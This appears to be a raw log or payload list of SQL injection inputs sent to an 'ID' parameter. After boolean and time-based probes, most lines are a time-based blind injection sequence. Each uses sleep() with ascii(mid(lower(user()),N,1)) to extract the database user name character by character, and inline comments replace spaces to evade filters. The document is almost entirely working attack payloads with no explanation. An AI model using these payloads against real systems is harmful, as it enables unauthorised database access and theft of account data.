ID:1
ID:1' and select 1-- 
ID:1' and 1=1-- 
ID:1' and 1=2-- 
ID:1' and 1=1-- 
ID:1' and 1=1-- 
ID:1' and 1=2-- 
ID:1' and 1=2-- 
ID:1' and IF(1=1,sleep(5),2)-- 
ID:1'/**/and/**/if(ascii(mid(lower(user()),36,1))=104,sleep(3),0)
ID:1'/**/and/**/if(ascii(mid(lower(user()),36,1))=105,sleep(3),0)
ID:1'/**/and/**/if(ascii(mid(lower(user()),36,1))=106,sleep(3),0)
ID:1'/**/and/**/if(ascii(mid(lower(user()),36,1))=107,sleep(3),0)
ID:1'/**/and/**/if(ascii(mid(lower(user()),36,1))=108,sleep(3),0)
ID:1'/**/and/**/if(ascii(mid(lower(user()),36,1))=109,sleep(3),0)
ID:1'/**/and/**/if(ascii(mid(lower(user()),36,1))=110,sleep(3),0)
ID:1'/**/and/**/if(ascii(mid(lower(user()),36,1))=111,sleep(3),0)
ID:1'/**/and/**/if(ascii(mid(lower(user()),36,1))=112,sleep(3),0)
ID:1'/**/and/**/if(ascii(mid(lower(user()),36,1))=113,sleep(3),0)
ID:1'/**/and/**/if(ascii(mid(lower(user()),36,1))=114,sleep(3),0)
ID:1'/**/and/**/if(ascii(mid(lower(user()),36,1))=115,sleep(3),0)
ID:1'/**/and/**/if(ascii(mid(lower(user()),36,1))=116,sleep(3),0)
ID:1'/**/and/**/if(ascii(mid(lower(user()),36,1))=117,sleep(3),0)
ID:1'/**/and/**/if(ascii(mid(lower(user()),36,1))=118,sleep(3),0)
ID:1'/**/and/**/if(ascii(mid(lower(user()),36,1))=119,sleep(3),0)
ID:1'/**/and/**/if(ascii(mid(lower(user()),36,1))=120,sleep(3),0)
ID:1'/**/and/**/if(ascii(mid(lower(user()),36,1))=121,sleep(3),0)
ID:1'/**/and/**/if(ascii(mid(lower(user()),36,1))=122,sleep(3),0)
ID:1'/**/and/**/if(ascii(mid(lower(user()),36,1))=49,sleep(3),0)
ID:1'/**/and/**/if(ascii(mid(lower(user()),36,1))=50,sleep(3),0)
ID:1'/**/and/**/if(ascii(mid(lower(user()),36,1))=51,sleep(3),0)
ID:1'/**/and/**/if(ascii(mid(lower(user()),36,1))=52,sleep(3),0)
ID:1'/**/and/**/if(ascii(mid(lower(user()),36,1))=53,sleep(3),0)
ID:1'/**/and/**/if(ascii(mid(lower(user()),36,1))=54,sleep(3),0)
ID:1'/**/and/**/if(ascii(mid(lower(user()),36,1))=55,sleep(3),0)
ID:1'/**/and/**/if(ascii(mid(lower(user()),36,1))=56,sleep(3),0)
ID:1'/**/and/**/if(ascii(mid(lower(user()),36,1))=57,sleep(3),0)
ID:1'/**/and/**/if(ascii(mid(lower(user()),36,1))=48,sleep(3),0)
ID:1'/**/and/**/if(ascii(mid(lower(user()),36,1))=46,sleep(3),0)
ID:1'/**/and/**/if(ascii(mid(lower(user()),36,1))=64,sleep(3),0)
ID:1'/**/and/**/if(ascii(mid(lower(user()),36,1))=95,sleep(3),0)
ID:1'/**/and/**/if(ascii(mid(lower(user()),36,1))=42,sleep(3),0)
ID:1'/**/and/**/if(ascii(mid(lower(user()),36,1))=37,sleep(3),0)
ID:1'/**/and/**/if(ascii(mid(lower(user()),37,1))=97,sleep(3),0)
ID:1'/**/and/**/if(ascii(mid(lower(user()),37,1))=98,sleep(3),0)
ID:1'/**/and/**/if(ascii(mid(lower(user()),37,1))=99,sleep(3),0)
ID:1'/**/and/**/if(ascii(mid(lower(user()),37,1))=100,sleep(3),0)
ID:1'/**/and/**/if(ascii(mid(lower(user()),37,1))=101,sleep(3),0)
ID:1'/**/and/**/if(ascii(mid(lower(user()),37,1))=102,sleep(3),0)
ID:1'/**/and/**/if(ascii(mid(lower(user()),37,1))=103,sleep(3),0)
ID:1'/**/and/**/if(ascii(mid(lower(user()),37,1))=104,sleep(3),0)
ID:1'/**/and/**/if(ascii(mid(lower(user()),37,1))=105,sleep(3),0)
ID:1'/**/and/**/if(ascii(mid(lower(user()),37,1))=106,sleep(3),0)
ID:1'/**/and/**/if(ascii(mid(lower(user()),37,1))=107,sleep(3),0)
ID:1'/**/and/**/if(ascii(mid(lower(user()),37,1))=108,sleep(3),0)
ID:1'/**/and/**/if(ascii(mid(lower(user()),37,1))=109,sleep(3),0)
ID:1'/**/and/**/if(ascii(mid(lower(user()),37,1))=110,sleep(3),0)
ID:1'/**/and/**/if(ascii(mid(lower(user()),37,1))=111,sleep(3),0)
ID:1'/**/and/**/if(ascii(mid(lower(user()),37,1))=112,sleep(3),0)
ID:1'/**/and/**/if(ascii(mid(lower(user()),37,1))=113,sleep(3),0)
ID:1'/**/and/**/if(ascii(mid(lower(user()),37,1))=114,sleep(3),0)
ID:1'/**/and/**/if(ascii(mid(lower(user()),37,1))=115,sleep(3),0)
ID:1'/**/and/**/if(ascii(mid(lower(user()),37,1))=116,sleep(3),0)
ID:1'/**/and/**/if(ascii(mid(lower(user()),37,1))=117,sleep(3),0)
ID:1'/**/and/**/if(ascii(mid(lower(user()),37,1))=118,sleep(3),0)
ID:1'/**/and/**/if(ascii(mid(lower(user()),37,1))=119,sleep(3),0)
ID:1'/**/and/**/if(ascii(mid(lower(user()),37,1))=120,sleep(3),0)
ID:1'/**/and/**/if(ascii(mid(lower(user()),37,1))=121,sleep(3),0)
ID:1'/**/and/**/if(ascii(mid(lower(user()),37,1))=122,sleep(3),0)
ID:1'/**/and/**/if(ascii(mid(lower(user()),37,1))=49,sleep(3),0)
ID:1'/**/and/**/if(ascii(mid(lower(user()),37,1))=50,sleep(3),0)
ID:1'/**/and/**/if(ascii(mid(lower(user()),37,1))=51,sleep(3),0)
ID:1'/**/and/**/if(ascii(mid(lower(user()),37,1))=52,sleep(3),0)
ID:1'/**/and/**/if(ascii(mid(lower(user()),37,1))=53,sleep(3),0)
ID:1'/**/and/**/if(ascii(mid(lower(user()),37,1))=54,sleep(3),0)
ID:1'/**/and/**/if(ascii(mid(lower(user()),37,1))=55,sleep(3),0)
ID:1'/**/and/**/if(ascii(mid(lower(user()),37,1))=56,sleep(3),0)
ID:1'/**/and/**/if(ascii(mid(lower(user()),37,1))=57,sleep(3),0)
ID:1'/**/and/**/if(ascii(mid(lower(user()),37,1))=48,sleep(3),0)
ID:1'/**/and/**/if(ascii(mid(lower(user()),37,1))=46,sleep(3),0)
ID:1'/**/and/**/if(ascii(mid(lower(user()),37,1))=64,sleep(3),0)
ID:1'/**/and/**/if(ascii(mid(lower(user()),37,1))=95,sleep(3),0)
ID:1'/**/and/**/if(ascii(mid(lower(user()),37,1))=42,sleep(3),0)
ID:1'/**/and/**/if(ascii(mid(lower(user()),37,1))=37,sleep(3),0)
ID:1'/**/and/**/if(ascii(mid(lower(user()),38,1))=97,sleep(3),0)
ID:1'/**/and/**/if(ascii(mid(lower(user()),38,1))=98,sleep(3),0)
ID:1'/**/and/**/if(ascii(mid(lower(user()),38,1))=99,sleep(3),0)
ID:1'/**/and/**/if(ascii(mid(lower(user()),38,1))=100,sleep(3),0)
ID:1'/**/and/**/if(ascii(mid(lower(user()),38,1))=101,sleep(3),0)
ID:1'/**/and/**/if(ascii(mid(lower(user()),38,1))=102,sleep(3),0)
ID:1'/**/and/**/if(ascii(mid(lower(user()),38,1))=103,sleep(3),0)
ID:1'/**/and/**/if(ascii(mid(lower(user()),38,1))=104,sleep(3),0)
ID:1'/**/and/**/if(ascii(mid(lower(user()),38,1))=105,sleep(3),0)
ID:1'/**/and/**/if(ascii(mid(lower(user()),38,1))=106,sleep(3),0)
ID:1'/**/and/**/if(ascii(mid(lower(user()),38,1))=107,sleep(3),0)
ID:1'/**/and/**/if(ascii(mid(lower(user()),38,1))=108,sleep(3),0)
ID:1'/**/and/**/if(ascii(mid(lower(user()),38,1))=109,sleep(3),0)
ID:1'/**/and/**/if(ascii(mid(lower(user()),38,1))=110,sleep(3),0)
ID:1'/**/and/**/if(ascii(mid(lower(user()),38,1))=111,sleep(3),0)
ID:1'/**/and/**/if(ascii(mid(lower(user()),38,1))=112,sleep(3),0)
ID:1'/**/and/**/if(ascii(mid(lower(user()),38,1))=113,sleep(3),0)
ID:1'/**/and/**/if(ascii(mid(lower(user()),38,1))=114,sleep(3),0)
ID:1'/**/and/**/if(ascii(mid(lower(user()),38,1))=115,sleep(3),0)
ID:1'/**/and/**/if(ascii(mid(lower(user()),38,1))=116,sleep(3),0)
ID:1'/**/and/**/if(ascii(mid(lower(user()),38,1))=117,sleep(3),0)
ID:1'/**/and/**/if(ascii(mid(lower(user()),38,1))=118,sleep(3),0)
ID:1'/**/and/**/if(ascii(mid(lower(user()),38,1))=119,sleep(3),0)
ID:1'/**/and/**/if(ascii(mid(lower(user()),38,1))=120,sleep(3),0)
ID:1'/**/and/**/if(ascii(mid(lower(user()),38,1))=121,sleep(3),0)
ID:1'/**/and/**/if(ascii(mid(lower(user()),38,1))=122,sleep(3),0)
ID:1'/**/and/**/if(ascii(mid(lower(user()),38,1))=49,sleep(3),0)
ID:1'/**/and/**/if(ascii(mid(lower(user()),38,1))=50,sleep(3),0)
ID:1'/**/and/**/if(ascii(mid(lower(user()),38,1))=51,sleep(3),0)
ID:1'/**/and/**/if(ascii(mid(lower(user()),38,1))=52,sleep(3),0)
ID:1'/**/and/**/if(ascii(mid(lower(user()),38,1))=53,sleep(3),0)
ID:1'/**/and/**/if(ascii(mid(lower(user()),38,1))=54,sleep(3),0)
ID:1'/**/and/**/if(ascii(mid(lower(user()),38,1))=55,sleep(3),0)
ID:1'/**/and/**/if(ascii(mid(lower(user()),38,1))=56,sleep(3),0)
ID:1'/**/and/**/if(ascii(mid(lower(user()),38,1))=57,sleep(3),0)
ID:1'/**/and/**/if(ascii(mid(lower(user()),38,1))=48,sleep(3),0)
ID:1'/**/and/**/if(ascii(mid(lower(user()),38,1))=46,sleep(3),0)
ID:1'/**/and/**/if(ascii(mid(lower(user()),38,1))=64,sleep(3),0)
ID:1'/**/and/**/if(ascii(mid(lower(user()),38,1))=95,sleep(3),0)
ID:1'/**/and/**/if(ascii(mid(lower(user()),38,1))=42,sleep(3),0)
ID:1'/**/and/**/if(ascii(mid(lower(user()),38,1))=37,sleep(3),0)
ID:1'/**/and/**/if(ascii(mid(lower(user()),39,1))=97,sleep(3),0)
ID:1'/**/and/**/if(ascii(mid(lower(user()),39,1))=98,sleep(3),0)
ID:1'/**/and/**/if(ascii(mid(lower(user()),39,1))=99,sleep(3),0)
ID:1'/**/and/**/if(ascii(mid(lower(user()),39,1))=100,sleep(3),0)
ID:1'/**/and/**/if(ascii(mid(lower(user()),39,1))=101,sleep(3),0)
ID:1'/**/and/**/if(ascii(mid(lower(user()),39,1))=102,sleep(3),0)
ID:1'/**/and/**/if(ascii(mid(lower(user()),39,1))=103,sleep(3),0)
ID:1'/**/and/**/if(ascii(mid(lower(user()),39,1))=104,sleep(3),0)
ID:1'/**/and/**/if(ascii(mid(lower(user()),39,1))=105,sleep(3),0)
ID:1'/**/and/**/if(ascii(mid(lower(user()),39,1))=106,sleep(3),0)
ID:1'/**/and/**/if(ascii(mid(lower(user()),39,1))=107,sleep(3),0)
ID:1'/**/and/**/if(ascii(mid(lower(user()),39,1))=108,sleep(3),0)
ID:1'/**/and/**/if(ascii(mid(lower(user()),39,1))=109,sleep(3),0)
ID:1'/**/and/**/if(ascii(mid(lower(user()),39,1))=110,sleep(3),0)
ID:1'/**/and/**/if(ascii(mid(lower(user()),39,1))=111,sleep(3),0)
ID:1'/**/and/**/if(ascii(mid(lower(user()),39,1))=112,sleep(3),0)
ID:1'/**/and/**/if(ascii(mid(lower(user()),39,1))=113,sleep(3),0)
ID:1'/**/and/**/if(ascii(mid(lower(user()),39,1))=114,sleep(3),0)
ID:1'/**/and/**/if(ascii(mid(lower(user()),39,1))=115,sleep(3),0)
ID:1'/**/and/**/if(ascii(mid(lower(user()),39,1))=116,sleep(3),0)
ID:1'/**/and/**/if(ascii(mid(lower(user()),39,1))=117,sleep(3),0)
ID:1'/**/and/**/if(ascii(mid(lower(user()),39,1))=118,sleep(3),0)
ID:1'/**/and/**/if(ascii(mid(lower(user()),39,1))=119,sleep(3),0)
ID:1'/**/and/**/if(ascii(mid(lower(user()),39,1))=120,sleep(3),0)
ID:1'/**/and/**/if(ascii(mid(lower(user()),39,1))=121,sleep(3),0)
ID:1'/**/and/**/if(ascii(mid(lower(user()),39,1))=122,sleep(3),0)
ID:1'/**/and/**/if(ascii(mid(lower(user()),39,1))=49,sleep(3),0)
ID:1'/**/and/**/if(ascii(mid(lower(user()),39,1))=50,sleep(3),0)
ID:1'/**/and/**/if(ascii(mid(lower(user()),39,1))=51,sleep(3),0)
ID:1'/**/and/**/if(ascii(mid(lower(user()),39,1))=52,sleep(3),0)
ID:1'/**/and/**/if(ascii(mid(lower(user()),39,1))=53,sleep(3),0)
ID:1'/**/and/**/if(ascii(mid(lower(user()),39,1))=54,sleep(3),0)
ID:1'/**/and/**/if(ascii(mid(lower(user()),39,1))=55,sleep(3),0)
ID:1'/**/and/**/if(ascii(mid(lower(user()),39,1))=56,sleep(3),0)
ID:1'/**/and/**/if(ascii(mid(lower(user()),39,1))=57,sleep(3),0)
ID:1'/**/and/**/if(ascii(mid(lower(user()),39,1))=48,sleep(3),0)
ID:1'/**/and/**/if(ascii(mid(lower(user()),39,1))=46,sleep(3),0)
ID:1'/**/and/**/if(ascii(mid(lower(user()),39,1))=64,sleep(3),0)
ID:1'/**/and/**/if(ascii(mid(lower(user()),39,1))=95,sleep(3),0)
ID:1'/**/and/**/if(ascii(mid(lower(user()),39,1))=42,sleep(3),0)
ID:1'/**/and/**/if(ascii(mid(lower(user()),39,1))=37,sleep(3),0)
ID:1'/**/and/**/if(ascii(mid(lower(user()),40,1))=97,sleep(3),0)
ID:1'/**/and/**/if(ascii(mid(lower(user()),40,1))=98,sleep(3),0)
ID:1'/**/and/**/if(ascii(mid(lower(user()),40,1))=99,sleep(3),0)
ID:1'/**/and/**/if(ascii(mid(lower(user()),40,1))=100,sleep(3),0)
ID:1'/**/and/**/if(ascii(mid(lower(user()),40,1))=101,sleep(3),0)
ID:1'/**/and/**/if(ascii(mid(lower(user()),40,1))=102,sleep(3),0)
ID:1'/**/and/**/if(ascii(mid(lower(user()),40,1))=103,sleep(3),0)
ID:1'/**/and/**/if(ascii(mid(lower(user()),40,1))=104,sleep(3),0)
ID:1'/**/and/**/if(ascii(mid(lower(user()),40,1))=105,sleep(3),0)
ID:1'/**/and/**/if(ascii(mid(lower(user()),40,1))=106,sleep(3),0)
ID:1'/**/and/**/if(ascii(mid(lower(user()),40,1))=107,sleep(3),0)
ID:1'/**/and/**/if(ascii(mid(lower(user()),40,1))=108,sleep(3),0)
ID:1'/**/and/**/if(ascii(mid(lower(user()),40,1))=109,sleep(3),0)
ID:1'/**/and/**/if(ascii(mid(lower(user()),40,1))=110,sleep(3),0)
ID:1'/**/and/**/if(ascii(mid(lower(user()),40,1))=111,sleep(3),0)
ID:1'/**/and/**/if(ascii(mid(lower(user()),40,1))=112,sleep(3),0)
ID:1'/**/and/**/if(ascii(mid(lower(user()),40,1))=113,sleep(3),0)
ID:1'/**/and/**/if(ascii(mid(lower(user()),40,1))=114,sleep(3),0)
ID:1'/**/and/**/if(ascii(mid(lower(user()),40,1))=115,sleep(3),0)
ID:1'/**/and/**/if(ascii(mid(lower(user()),40,1))=116,sleep(3),0)
ID:1'/**/and/**/if(ascii(mid(lower(user()),40,1))=117,sleep(3),0)
ID:1'/**/and/**/if(ascii(mid(lower(user()),40,1))=118,sleep(3),0)
ID:1'/**/and/**/if(ascii(mid(lower(user()),40,1))=119,sleep(3),0)
ID:1'/**/and/**/if(ascii(mid(lower(user()),40,1))=120,sleep(3),0)
ID:1'/**/and/**/if(ascii(mid(lower(user()),40,1))=121,sleep(3),0)
ID:1'/**/and/**/if(ascii(mid(lower(user()),40,1))=122,sleep(3),0)
ID:1'/**/and/**/if(ascii(mid(lower(user()),40,1))=49,sleep(3),0)
ID:1'/**/and/**/if(ascii(mid(lower(user()),40,1))=50,sleep(3),0)
ID:1'/**/and/**/if(ascii(mid(lower(user()),40,1))=51,sleep(3),0)
ID:1'/**/and/**/if(ascii(mid(lower(user()),40,1))=52,sleep(3),0)
ID:1'/**/and/**/if(ascii(mid(lower(user()),40,1))=53,sleep(3),0)
ID:1'/**/and/**/if(ascii(mid(lower(user()),40,1))=54,sleep(3),0)
ID:1'/**/and/**/if(ascii(mid(lower(user()),40,1))=55,sleep(3),0)
ID:1'/**/and/**/if(ascii(mid(lower(user()),40,1))=56,sleep(3),0)
ID:1'/**/and/**/if(ascii(mid(lower(user()),40,1))=57,sleep(3),0)
ID:1'/**/and/**/if(ascii(mid(lower(user()),40,1))=48,sleep(3),0)
ID:1'/**/and/**/if(ascii(mid(lower(user()),40,1))=46,sleep(3),0)
ID:1'/**/and/**/if(ascii(mid(lower(user()),40,1))=64,sleep(3),0)
ID:1'/**/and/**/if(ascii(mid(lower(user()),40,1))=95,sleep(3),0)
ID:1'/**/and/**/if(ascii(mid(lower(user()),40,1))=42,sleep(3),0)
ID:1'/**/and/**/if(ascii(mid(lower(user()),40,1))=37,sleep(3),0)
ID:1'/**/and/**/if(ascii(mid(lower(user()),41,1))=97,sleep(3),0)
ID:1'/**/and/**/if(ascii(mid(lower(user()),41,1))=98,sleep(3),0)
ID:1'/**/and/**/if(ascii(mid(lower(user()),41,1))=99,sleep(3),0)
ID:1'/**/and/**/if(ascii(mid(lower(user()),41,1))=100,sleep(3),0)
ID:1'/**/and/**/if(ascii(mid(lower(user()),41,1))=101,sleep(3),0)
ID:1'/**/and/**/if(ascii(mid(lower(user()),41,1))=102,sleep(3),0)
ID:1'/**/and/**/if(ascii(mid(lower(user()),41,1))=103,sleep(3),0)
ID:1'/**/and/**/if(ascii(mid(lower(user()),41,1))=104,sleep(3),0)
ID:1'/**/and/**/if(ascii(mid(lower(user()),41,1))=105,sleep(3),0)
ID:1'/**/and/**/if(ascii(mid(lower(user()),41,1))=106,sleep(3),0)
ID:1'/**/and/**/if(ascii(mid(lower(user()),41,1))=107,sleep(3),0)
ID:1'/**/and/**/if(ascii(mid(lower(user()),41,1))=108,sleep(3),0)
ID:1'/**/and/**/if(ascii(mid(lower(user()),41,1))=109,sleep(3),0)
ID:1'/**/and/**/if(ascii(mid(lower(user()),41,1))=110,sleep(3),0)
ID:1'/**/and/**/if(ascii(mid(lower(user()),41,1))=111,sleep(3),0)
ID:1'/**/and/**/if(ascii(mid(lower(user()),41,1))=112,sleep(3),0)
ID:1'/**/and/**/if(ascii(mid(lower(user()),41,1))=113,sleep(3),0)
ID:1'/**/and/**/if(ascii(mid(lower(user()),41,1))=114,sleep(3),0)
ID:1'/**/and/**/if(ascii(mid(lower(user()),41,1))=115,sleep(3),0)
ID:1'/**/and/**/if(ascii(mid(lower(user()),41,1))=116,sleep(3),0)
ID:1'/**/and/**/if(ascii(mid(lower(user()),41,1))=117,sleep(3),0)
ID:1'/**/and/**/if(ascii(mid(lower(user()),41,1))=118,sleep(3),0)
ID:1'/**/and/**/if(ascii(mid(lower(user()),41,1))=119,sleep(3),0)
ID:1'/**/and/**/if(ascii(mid(lower(user()),41,1))=120,sleep(3),0)
ID:1'/**/and/**/if(ascii(mid(lower(user()),41,1))=121,sleep(3),0)
ID:1'/**/and/**/if(ascii(mid(lower(user()),41,1))=122,sleep(3),0)
ID:1'/**/and/**/if(ascii(mid(lower(user()),41,1))=49,sleep(3),0)
ID:1'/**/and/**/if(ascii(mid(lower(user()),41,1))=50,sleep(3),0)
ID:1'/**/and/**/if(ascii(mid(lower(user()),41,1))=51,sleep(3),0)
ID:1'/**/and/**/if(ascii(mid(lower(user()),41,1))=52,sleep(3),0)
ID:1'/**/and/**/if(ascii(mid(lower(user()),41,1))=53,sleep(3),0)
ID:1'/**/and/**/if(ascii(mid(lower(user()),41,1))=54,sleep(3),0)
ID:1'/**/and/**/if(ascii(mid(lower(user()),41,1))=55,sleep(3),0)
ID:1'/**/and/**/if(ascii(mid(lower(user()),41,1))=56,sleep(3),0)
ID:1'/**/and/**/if(ascii(mid(lower(user()),41,1))=57,sleep(3),0)
ID:1'/**/and/**/if(ascii(mid(lower(user()),41,1))=48,sleep(3),0)
ID:1'/**/and/**/if(ascii(mid(lower(user()),41,1))=46,sleep(3),0)
ID:1'/**/and/**/if(ascii(mid(lower(user()),41,1))=64,sleep(3),0)
ID:1'/**/and/**/if(ascii(mid(lower(user()),41,1))=95,sleep(3),0)
ID:1'/**/and/**/if(ascii(mid(lower(user()),41,1))=42,sleep(3),0)
ID:1'/**/and/**/if(ascii(mid(lower(user()),41,1))=37,sleep(3),0)
ID:1'/**/and/**/if(ascii(mid(lower(user()),42,1))=97,sleep(3),0)
ID:1'/**/and/**/if(ascii(mid(lower(user()),42,1))=98,sleep(3),0)
ID:1'/**/and/**/if(ascii(mid(lower(user()),42,1))=99,sleep(3),0)
ID:1'/**/and/**/if(ascii(mid(lower(user()),42,1))=100,sleep(3),0)
ID:1'/**/and/**/if(ascii(mid(lower(user()),42,1))=101,sleep(3),0)
ID:1'/**/and/**/if(ascii(mid(lower(user()),42,1))=102,sleep(3),0)
ID:1'/**/and/**/if(ascii(mid(lower(user()),42,1))=103,sleep(3),0)
ID:1'/**/and/**/if(ascii(mid(lower(user()),42,1))=104,sleep(3),0)
ID:1'/**/and/**/if(ascii(mid(lower(user()),42,1))=105,sleep(3),0)
ID:1'/**/and/**/if(ascii(mid(lower(user()),42,1))=106,sleep(3),0)
ID:1'/**/and/**/if(ascii(mid(lower(user()),42,1))=107,sleep(3),0)
ID:1'/**/and/**/if(ascii(mid(lower(user()),42,1))=108,sleep(3),0)
ID:1'/**/and/**/if(ascii(mid(lower(user()),42,1))=109,sleep(3),0)
ID:1'/**/and/**/if(ascii(mid(lower(user()),42,1))=110,sleep(3),0)
ID:1'/**/and/**/if(ascii(mid(lower(user()),42,1))=111,sleep(3),0)
ID:1'/**/and/**/if(ascii(mid(lower(user()),42,1))=112,sleep(3),0)
ID:1'/**/and/**/if(ascii(mid(lower(user()),42,1))=113,sleep(3),0)
ID:1'/**/and/**/if(ascii(mid(lower(user()),42,1))=114,sleep(3),0)
ID:1'/**/and/**/if(ascii(mid(lower(user()),42,1))=115,sleep(3),0)
ID:1'/**/and/**/if(ascii(mid(lower(user()),42,1))=116,sleep(3),0)
ID:1'/**/and/**/if(ascii(mid(lower(user()),42,1))=117,sleep(3),0)
ID:1'/**/and/**/if(ascii(mid(lower(user()),42,1))=118,sleep(3),0)
ID:1'/**/and/**/if(ascii(mid(lower(user()),42,1))=119,sleep(3),0)
ID:1'/**/and/**/if(ascii(mid(lower(user()),42,1))=120,sleep(3),0)
ID:1'/**/and/**/if(ascii(mid(lower(user()),42,1))=121,sleep(3),0)
ID:1'/**/and/**/if(ascii(mid(lower(user()),42,1))=122,sleep(3),0)
ID:1'/**/and/**/if(ascii(mid(lower(user()),42,1))=49,sleep(3),0)
ID:1'/**/and/**/if(ascii(mid(lower(user()),42,1))=50,sleep(3),0)
ID:1'/**/and/**/if(ascii(mid(lower(user()),42,1))=51,sleep(3),0)
ID:1'/**/and/**/if(ascii(mid(lower(user()),42,1))=52,sleep(3),0)
ID:1'/**/and/**/if(ascii(mid(lower(user()),42,1))=53,sleep(3),0)
ID:1'/**/and/**/if(ascii(mid(lower(user()),42,1))=54,sleep(3),0)
ID:1'/**/and/**/if(ascii(mid(lower(user()),42,1))=55,sleep(3),0)
ID:1'/**/and/**/if(ascii(mid(lower(user()),42,1))=56,sleep(3),0)
ID:1'/**/and/**/if(ascii(mid(lower(user()),42,1))=57,sleep(3),0)
ID:1'/**/and/**/if(ascii(mid(lower(user()),42,1))=48,sleep(3),0)
ID:1'/**/and/**/if(ascii(mid(lower(user()),42,1))=46,sleep(3),0)
ID:1'/**/and/**/if(ascii(mid(lower(user()),42,1))=64,sleep(3),0)
ID:1'/**/and/**/if(ascii(mid(lower(user()),42,1))=95,sleep(3),0)
ID:1'/**/and/**/if(ascii(mid(lower(user()),42,1))=42,sleep(3),0)
ID:1'/**/and/**/if(ascii(mid(lower(user()),42,1))=37,sleep(3),0)
ID:1'/**/and/**/if(ascii(mid(lower(user()),43,1))=97,sleep(3),0)
ID:1'/**/and/**/if(ascii(mid(lower(user()),43,1))=98,sleep(3),0)
ID:1'/**/and/**/if(ascii(mid(lower(user()),43,1))=99,sleep(3),0)
ID:1'/**/and/**/if(ascii(mid(lower(user()),43,1))=100,sleep(3),0)
ID:1'/**/and/**/if(ascii(mid(lower(user()),43,1))=101,sleep(3),0)
ID:1'/**/and/**/if(ascii(mid(lower(user()),43,1))=102,sleep(3),0)
ID:1'/**/and/**/if(ascii(mid(lower(user()),43,1))=103,sleep(3),0)
ID:1'/**/and/**/if(ascii(mid(lower(user()),43,1))=104,sleep(3),0)
ID:1'/**/and/**/if(ascii(mid(lower(user()),43,1))=105,sleep(3),0)
ID:1'/**/and/**/if(ascii(mid(lower(user()),43,1))=106,sleep(3),0)
ID:1'/**/and/**/if(ascii(mid(lower(user()),43,1))=107,sleep(3),0)
ID:1'/**/and/**/if(ascii(mid(lower(user()),43,1))=108,sleep(3),0)
ID:1'/**/and/**/if(ascii(mid(lower(user()),43,1))=109,sleep(3),0)
ID:1'/**/and/**/if(ascii(mid(lower(user()),43,1))=110,sleep(3),0)
ID:1'/**/and/**/if(ascii(mid(lower(user()),43,1))=111,sleep(3),0)
ID:1'/**/and/**/if(ascii(mid(lower(user()),43,1))=112,sleep(3),0)
ID:1'/**/and/**/if(ascii(mid(lower(user()),43,1))=113,sleep(3),0)
ID:1'/**/and/**/if(ascii(mid(lower(user()),43,1))=114,sleep(3),0)
ID:1'/**/and/**/if(ascii(mid(lower(user()),43,1))=115,sleep(3),0)
ID:1'/**/and/**/if(ascii(mid(lower(user()),43,1))=116,sleep(3),0)
ID:1'/**/and/**/if(ascii(mid(lower(user()),43,1))=117,sleep(3),0)
ID:1'/**/and/**/if(ascii(mid(lower(user()),43,1))=118,sleep(3),0)
ID:1'/**/and/**/if(ascii(mid(lower(user()),43,1))=119,sleep(3),0)
ID:1'/**/and/**/if(ascii(mid(lower(user()),43,1))=120,sleep(3),0)
ID:1'/**/and/**/if(ascii(mid(lower(user()),43,1))=121,sleep(3),0)
ID:1'/**/and/**/if(ascii(mid(lower(user()),43,1))=122,sleep(3),0)
ID:1'/**/and/**/if(ascii(mid(lower(user()),43,1))=49,sleep(3),0)
ID:1'/**/and/**/if(ascii(mid(lower(user()),43,1))=50,sleep(3),0)
ID:1'/**/and/**/if(ascii(mid(lower(user()),43,1))=51,sleep(3),0)
ID:1'/**/and/**/if(ascii(mid(lower(user()),43,1))=52,sleep(3),0)
ID:1'/**/and/**/if(ascii(mid(lower(user()),43,1))=53,sleep(3),0)
ID:1'/**/and/**/if(ascii(mid(lower(user()),43,1))=54,sleep(3),0)
ID:1'/**/and/**/if(ascii(mid(lower(user()),43,1))=55,sleep(3),0)
ID:1'/**/and/**/if(ascii(mid(lower(user()),43,1))=56,sleep(3),0)
ID:1'/**/and/**/if(ascii(mid(lower(user()),43,1))=57,sleep(3),0)
ID:1'/**/and/**/if(ascii(mid(lower(user()),43,1))=48,sleep(3),0)
ID:1'/**/and/**/if(ascii(mid(lower(user()),43,1))=46,sleep(3),0)
ID:1'/**/and/**/if(ascii(mid(lower(user()),43,1))=64,sleep(3),0)
ID:1'/**/and/**/if(ascii(mid(lower(user()),43,1))=95,sleep(3),0)
ID:1'/**/and/**/if(ascii(mid(lower(user()),43,1))=42,sleep(3),0)
ID:1'/**/and/**/if(ascii(mid(lower(user()),43,1))=37,sleep(3),0)
ID:1'/**/and/**/if(ascii(mid(lower(user()),44,1))=97,sleep(3),0)
